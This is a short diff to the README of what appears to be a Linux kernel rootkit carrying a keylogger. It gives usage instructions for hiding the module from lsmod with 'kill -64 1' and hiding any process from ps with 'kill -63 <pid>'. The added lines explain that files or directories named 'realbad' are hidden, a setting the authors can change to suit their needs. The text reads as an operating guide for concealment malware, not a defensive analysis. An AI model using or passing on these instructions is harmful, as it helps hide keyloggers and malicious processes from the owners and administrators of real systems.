@@ -12,3 +12,5 @@ Hidings implemented:
 To hide this module: kill -64 1. Check lsmod to see keylogger is gone.
 
 To hide any pid: kill -63 <pid>. e.g. to hide process bash with pid 2296, do kill -63 2296. Check ps to see bash is gone.
+  
+To hide a file, we currently have it hardcoded to hide any files or directories named "realbad". This can be changed to our needs.
